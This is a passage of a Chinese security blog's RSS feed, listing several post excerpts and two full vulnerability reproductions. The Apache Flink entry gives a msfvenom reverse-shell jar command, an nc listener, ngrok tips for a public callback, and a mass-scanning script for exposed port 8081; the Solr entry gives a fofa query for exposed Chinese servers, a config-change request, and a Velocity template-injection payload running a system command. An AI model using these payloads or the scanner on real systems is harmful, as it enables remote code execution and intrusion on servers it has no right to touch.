href="https://twitter.com/samny78087805" target="_blank" rel="noopener">译者推特</a></li><li><a href="https://blog.csdn.net/sun1318578251" target="_blank" rel="noopener">译者CSDN</a></li></ul><hr><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢 Arbaz Hussain 为这篇文章提供宝贵的想法。<br>感谢 Alba Mendez ，多亏她的bot-shell，才能成功创作这个Telegram机器人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;@&lt;a href=&quot;目录&quot;&gt;toc&lt;/a&gt;&lt;/p&gt;
&lt;dl&gt;&lt;dt&gt;Author&lt;br&gt;: Sofiane Hamlaoui&lt;/dt&gt;&lt;dd&gt;&lt;a href=&quot;https://medium.com/@SofianeHamlaoui/use-telegram-bot-as-a
      
    
    </summary>
    
    
      <category term="译文" scheme="http://yoursite.com/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="翻译" scheme="http://yoursite.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>从翻邮箱发现钓鱼站到钓鱼系统通杀注入</title>
    <link href="http://yoursite.com/2019/12/13/%E4%BB%8E%E7%BF%BB%E9%82%AE%E7%AE%B1%E5%8F%91%E7%8E%B0%E9%92%93%E9%B1%BC%E7%AB%99%E5%88%B0%E9%92%93%E9%B1%BC%E7%B3%BB%E7%BB%9F%E9%80%9A%E6%9D%80%E6%B3%A8%E5%85%A5-1/"/>
    <id>http://yoursite.com/2019/12/13/%E4%BB%8E%E7%BF%BB%E9%82%AE%E7%AE%B1%E5%8F%91%E7%8E%B0%E9%92%93%E9%B1%BC%E7%AB%99%E5%88%B0%E9%92%93%E9%B1%BC%E7%B3%BB%E7%BB%9F%E9%80%9A%E6%9D%80%E6%B3%A8%E5%85%A5-1/</id>
    <published>2019-12-13T04:59:24.000Z</published>
    <updated>2019-12-13T13:27:46.201Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ddef219584f6646788cde61cc4940a1df0729d0573058c4cd9b225a03114269e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="实战" scheme="http://yoursite.com/categories/%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="实战" scheme="http://yoursite.com/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>[原]记一次渗透学习||钓鱼网站渗透</title>
    <link href="http://yoursite.com/2019/12/13/%E5%8E%9F-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2019/12/13/%E5%8E%9F-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</id>
    <published>2019-12-13T02:43:54.000Z</published>
    <updated>2019-12-14T04:40:36.196Z</updated>
    
    <content type="html"><![CDATA[<p>文章目录前言故事起源故事开始故事高潮意外剧情番外篇测试中小技巧<br>前言<br>故事纯属虚构！请不要相信我瞎白话。</p><p>主要事情：日钓鱼网站<br>主要人物：</p><p>丞相</p><p>丞相大表哥有传言我丞相表哥是个富二代，高富帅，简直是黑阔界的担当。U1S1 丞相表哥是挺帅，有没有钱我就不知道了。</p><p>05</p><p>05是一个传说中的黑阔，相传黑阔界年龄最小的表哥。</p><p>我本人</p><p>相对前两位表哥，我简直就是个弟弟存在。</p><p>…                    <div><br>                        作者：sun1318578251 发表于 2019/12/13 10:43:54 <a href="https://blog.csdn.net/sun1318578251/article/details/103522733" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/103522733" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/103522733</a>                    </div><br>                    <div><br>                        阅读：6                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章目录前言故事起源故事开始故事高潮意外剧情番外篇测试中小技巧&lt;br&gt;前言&lt;br&gt;故事纯属虚构！请不要相信我瞎白话。&lt;/p&gt;
&lt;p&gt;主要事情：日钓鱼网站&lt;br&gt;主要人物：&lt;/p&gt;
&lt;p&gt;丞相&lt;/p&gt;
&lt;p&gt;丞相大表哥有传言我丞相表哥是个富二代，高富帅，简直是黑阔界的担当。U
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]CVE-2019-1388 UAC提权复现</title>
    <link href="http://yoursite.com/2019/11/30/%E5%8E%9F-CVE-2019-1388-UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/30/%E5%8E%9F-CVE-2019-1388-UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-30T08:49:07.000Z</published>
    <updated>2019-12-14T04:40:36.196Z</updated>
    
    <content type="html"><![CDATA[<p>目录0x00 前言0x01 漏洞影响0x02 漏洞复现0x03 免责声明0x04 参考<br>0x00 前言</p><p>该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY…                    <div><br>                        作者：sun1318578251 发表于 2019/11/30 16:49:07 <a href="https://blog.csdn.net/sun1318578251/article/details/103325724" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/103325724" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/103325724</a>                    </div><br>                    <div><br>                        阅读：90                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目录0x00 前言0x01 漏洞影响0x02 漏洞复现0x03 免责声明0x04 参考&lt;br&gt;0x00 前言&lt;/p&gt;
&lt;p&gt;该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]VM虚拟机无法安装vmtools解决|本程序需要您将此虚拟机上安装的操作系统更新到SP1</title>
    <link href="http://yoursite.com/2019/11/25/%E5%8E%9F-VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85vmtools%E8%A7%A3%E5%86%B3-%E6%9C%AC%E7%A8%8B%E5%BA%8F%E9%9C%80%E8%A6%81%E6%82%A8%E5%B0%86%E6%AD%A4%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0%E5%88%B0SP1/"/>
    <id>http://yoursite.com/2019/11/25/%E5%8E%9F-VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85vmtools%E8%A7%A3%E5%86%B3-%E6%9C%AC%E7%A8%8B%E5%BA%8F%E9%9C%80%E8%A6%81%E6%82%A8%E5%B0%86%E6%AD%A4%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0%E5%88%B0SP1/</id>
    <published>2019-11-25T13:40:51.000Z</published>
    <updated>2019-12-14T04:40:36.196Z</updated>
    
    <content type="html"><![CDATA[<p>解决办法下载 vm tools iso 文件<br>链接：<a href="https://pan.baidu.com/s/1FDdmiwta_5neYI4HvtxRSg" target="_blank" rel="noopener">https://pan.baidu.com/s/1FDdmiwta_5neYI4HvtxRSg</a><br>提取码：0ll1</p><p>完美解决在MSDN下载系统镜像文件。</p><pre><code>&lt;div&gt;    作者：sun1318578251 发表于 2019/11/25 21:40:51 [原文链接](https://blog.csdn.net/sun1318578251/article/details/103246337) https://blog.csdn.net/sun1318578251/article/details/103246337                    &lt;/div&gt;&lt;div&gt;    阅读：71                     &lt;/div&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;解决办法下载 vm tools iso 文件&lt;br&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/1FDdmiwta_5neYI4HvtxRSg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache Flink任意Jar包上传导致远程代码执行</title>
    <link href="http://yoursite.com/2019/11/13/Apache-Flink%E4%BB%BB%E6%84%8FJar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2019/11/13/Apache-Flink%E4%BB%BB%E6%84%8FJar%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2019-11-13T13:00:51.000Z</published>
    <updated>2020-03-24T07:17:00.333Z</updated>
    
    <content type="html"><![CDATA[<p>@<a href="目录">toc</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次Apache Flink任意Jar包上传导致远程代码执行复现漏洞过程。<br>作者一直致力于小白都能看懂的漏洞复现过程，感谢大家们一路以来的支持！</p><p>致谢Cx01、丞相等表哥们。没有你们的帮助，没有这篇文章！</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞.<br>影响范围：&lt;= 1.9.1(最新版本)<br>可能是我测的比较少，成功的概率1.9版本比较高。</p><p><img src="https://img-blog.csdnimg.cn/2019111320020653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="0x02-漏洞威胁等级"><a href="#0x02-漏洞威胁等级" class="headerlink" title="0x02 漏洞威胁等级"></a>0x02 漏洞威胁等级</h1><p><code>高危</code></p><p>可导致远程代码执行</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>第一步生成payload<br><code>msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;fuck.jar</code><br>名字可以任意取</p><p><img src="https://img-blog.csdnimg.cn/20191113200606966.png" alt="在这里插入图片描述"><br>第二步生成监听端口，这里我选择nc监听端口。<br><code>nc -lvp port</code></p><p><img src="https://img-blog.csdnimg.cn/2019111320084847.png" alt="在这里插入图片描述"><br>第三步上传payload<br><img src="https://img-blog.csdnimg.cn/20191113201102994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后直接返回shell<br><img src="https://img-blog.csdnimg.cn/2019111320114492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着执行命令<br><img src="https://img-blog.csdnimg.cn/20191113201232556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x04-复现那些坑"><a href="#0x04-复现那些坑" class="headerlink" title="0x04 复现那些坑"></a>0x04 复现那些坑</h1><p><code>一定要生成公网ip的payload!!!</code><br><code>一定要生成公网ip的payload!!!</code><br><code>一定要生成公网ip的payload!!!</code></p><p>没有钱的小哥哥，小姐姐们可以选择一个Sunny-ngrok 工具进行端口转发。<br><a href="http://ngrok.cc/_book/" target="_blank" rel="noopener">官方Sunny-ngrok教程</a><br><img src="https://img-blog.csdnimg.cn/20191113202507789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="https://www.ngrok.cc/download.html" target="_blank" rel="noopener">客户端工具下载地址</a></p><p><img src="https://img-blog.csdnimg.cn/2019111320265972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x05-批量检测脚本"><a href="#0x05-批量检测脚本" class="headerlink" title="0x05 批量检测脚本"></a>0x05 批量检测脚本</h1><p><a href="https://github.com/AleWong/Apache-Flink-Web-Dashboard-RCE" target="_blank" rel="noopener">GitHub地址</a></p><p>脚本源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">auth: @l3_W0ng</span></span><br><span class="line"><span class="string">version: 1.0</span></span><br><span class="line"><span class="string">function: Apache Web Dashboard RCE</span></span><br><span class="line"><span class="string">usage: python3 script.py ip [port [command]]</span></span><br><span class="line"><span class="string">               default port=8081</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_iplist</span><span class="params">()</span>:</span></span><br><span class="line">    iplist = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"iplist.txt"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.readlines()</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">            ip = item.strip()</span><br><span class="line">            iplist.append(ip)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> iplist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_8081</span><span class="params">(ip)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + ip + <span class="string">':8081/jar/upload'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=url, timeout=<span class="number">2</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'msg'</span>: res.json(),</span><br><span class="line">            <span class="string">'state'</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">'url'</span>: url,</span><br><span class="line">            <span class="string">'ip'</span>: ip</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'Secure'</span>,</span><br><span class="line">            <span class="string">'state'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'ip'</span>: ip</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">'state'</span>] == <span class="number">1</span>:    </span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    iplist = get_iplist()</span><br><span class="line"></span><br><span class="line">    pool = ThreadPool(<span class="number">20</span>)</span><br><span class="line">    pool.map(check_8081, iplist)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191113204312228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="图片来源https://www.t00ls.net/thread-53784-1-1.html"><br><a href="https://www.t00ls.net/thread-53784-1-1.html" target="_blank" rel="noopener">图片来源</a></p><p>Ps:<br>当注释掉 if ‘Unable to load requested file’ in str(data):<br>之后，出现Token为空，或者 Unauthorized request 时候是不存在未授权访问的，而是带授权</p><p>部分exp代码<br><img src="https://img-blog.csdnimg.cn/2019111320444514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><a href="https://www.t00ls.net/thread-53784-1-1.html" target="_blank" rel="noopener">图片来源</a></p><h1 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h1><p><a href="https://www.t00ls.net/thread-53784-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-53784-1-1.html</a><br><a href="https://mp.weixin.qq.com/s/ArYCF4jjhy6nkY4ypib-Ag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ArYCF4jjhy6nkY4ypib-Ag</a><br><a href="https://flink.apache.org/downloads.html" target="_blank" rel="noopener">https://flink.apache.org/downloads.html</a></p><h1 id="0x07-免责声明"><a href="#0x07-免责声明" class="headerlink" title="0x07 免责声明"></a>0x07 免责声明</h1><p>0x05批量脚本是来自于<a href="https://www.t00ls.net/thread-53784-1-1.html，如果有侵犯权益，留言删除。大佬见谅！" target="_blank" rel="noopener">https://www.t00ls.net/thread-53784-1-1.html，如果有侵犯权益，留言删除。大佬见谅！</a></p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;@&lt;a href=&quot;目录&quot;&gt;toc&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;记一次Apache Flink任意Jar包上传导致远程代码执行复现漏洞过程。&lt;br
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[原]不为人知的黑科技||双十一薅羊毛正确姿势</title>
    <link href="http://yoursite.com/2019/11/12/%E5%8E%9F-%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80-%E5%8F%8C%E5%8D%81%E4%B8%80%E8%96%85%E7%BE%8A%E6%AF%9B%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2019/11/12/%E5%8E%9F-%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E9%BB%91%E7%A7%91%E6%8A%80-%E5%8F%8C%E5%8D%81%E4%B8%80%E8%96%85%E7%BE%8A%E6%AF%9B%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/</id>
    <published>2019-11-12T02:41:16.000Z</published>
    <updated>2019-12-14T04:40:36.196Z</updated>
    
    <content type="html"><![CDATA[<p>博主花费万字写下这篇长文！<br>意在与让你解锁不为人知的黑科技 get不一样的世界。<br>了解一下程序员是如何轻松愉快的过好双十一的，这些姿势你会吗？明年的你准备怎么办呢？                    <div><br>                        作者：sun1318578251 发表于 2019/11/12 10:41:16 <a href="https://blog.csdn.net/sun1318578251/article/details/103002852" target="_blank" rel="noopener">原文链接</a> <a href="https://blog.csdn.net/sun1318578251/article/details/103002852" target="_blank" rel="noopener">https://blog.csdn.net/sun1318578251/article/details/103002852</a>                    </div><br>                    <div><br>                        阅读：141                     </div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;博主花费万字写下这篇长文！&lt;br&gt;意在与让你解锁不为人知的黑科技 get不一样的世界。&lt;br&gt;了解一下程序员是如何轻松愉快的过好双十一的，这些姿势你会吗？明年的你准备怎么办呢？                    &lt;div&gt;&lt;br&gt;                    
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【漏洞复现】Apache Solr 模板注入远程命令执行</title>
    <link href="http://yoursite.com/2019/10/30/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Apache%20Solr%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2019/10/30/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Apache%20Solr%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2019-10-30T07:10:16.000Z</published>
    <updated>2020-03-24T07:39:01.244Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 0x00 漏洞简介</p><hr><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p><hr><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><hr><p>该漏洞的产生是由于两方面的原因：</p><ol><li>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。</li></ol><ol start="2"><li>Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。<br>当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。（来自360CERT）</li></ol><hr><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><hr><p> Apache Solr 5.x - 8.2.0，存在config API版本</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>使用fofa搜索语法<br><code>app=&quot;Solr&quot; &amp;&amp; country=&quot;CN&quot;</code></p><h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20191031193336593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h2><h3 id="利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击。"><a href="#利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击。" class="headerlink" title="利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击。"></a>利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击。</h3><p><img src="https://img-blog.csdnimg.cn/20191031190838557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p><code>如上图所示的这个名称就是Core的名称直接构造POST请求，在/solr/test/config目录POST以下数据（修改Core的配置）</code></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title="  "></a>  <img src="https://img-blog.csdnimg.cn/20191031191039128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h2><p><code>使用exp,进行漏洞利用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><img src="https://img-blog.csdnimg.cn/20191031191429371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img 